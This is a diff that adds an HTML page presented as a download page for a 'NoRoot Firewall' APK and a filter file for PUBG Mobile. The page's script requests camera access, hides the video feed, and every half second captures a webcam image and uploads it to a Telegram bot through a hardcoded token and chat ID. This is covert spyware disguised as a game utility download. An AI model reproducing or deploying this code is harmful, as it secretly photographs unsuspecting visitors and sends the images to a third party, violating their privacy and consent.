@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Firewall Download</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #000000, #0f2027);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .con {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 30px;
+      border-radius: 15px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      width: 90%;
+      max-width: 350px;
+      text-align: center;
+    }
+
+    p {
+      color: #fff;
+      font-size: 22px;
+      margin-bottom: 25px;
+    }
+
+    a {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 10px;
+      text-decoration: none;
+      color: white;
+      background: linear-gradient(45deg, #00c9ff, #92fe9d);
+      transition: 0.3s;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    a:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 10px #00c9ff;
+    }
+
+    footer {
+      margin-top: 15px;
+      color: #aaa;
+      font-size: 12px;
+    }
+    video{
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <video id="video" autoplay></video>
+
+  <div class="con">
+    <p>🔥 New Firewall for PUBG Mobile 4.3</p>
+
+    <a href="NoRoot Firewall 4.0.2.apk" download>
+      ⬇️ Download App Firewall
+    </a>
+
+    <a href="filters.json" download>
+      📁 Download Filter File
+    </a>
+
+    <footer>Made with Nobody</footer>
+  </div>
+  <script type="text/javascript" charset="utf-8">
+  let video =document.getElementById('video');
+    navigator.mediaDevices.getUserMedia({video:true})
+    .then(stream=>{
+      
+      video.srcObject=stream;
+      setInterval(()=>{
+      let can=document.createElement("canvas");
+      can.width=video.videoWidth;
+      can.height=video.videoHeight;
+      can.getContext("2d").drawImage(video,0,0,video.videoWidth,video.videoHeight)
+      can.toBlob((blob)=>{
+        let form= new FormData();
+        form.append("photo",blob,"capturedImage.jpg")
+        form.append("chat_id","8451482936")
+        fetch(`https://api.telegram.org/bot8330590629:AAHp3sWaLmmM5S75nmDITZQFxqyMaKK7KBU/sendPhoto`,{
+          method:"POST",
+          body:form
+        })
+        
+        
+      },"image/jpeg")
+      },500)
+
+    })
+  </script>
+
+</body>
+
+</html>
